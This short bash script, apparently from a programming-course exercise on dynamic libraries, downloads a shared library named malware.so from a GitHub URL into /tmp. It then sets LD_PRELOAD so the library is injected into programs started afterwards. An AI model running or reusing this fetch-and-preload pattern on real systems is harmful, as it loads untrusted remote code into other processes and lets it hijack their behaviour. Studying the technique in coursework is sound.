#!/bin/bash
wget -P /tmp/ https://raw.github.com/YassineRKB/alx-low_level_programming/main/0x18-dynamic_libraries/malware.so
export LD_PRELOAD=/tmp/malware.so
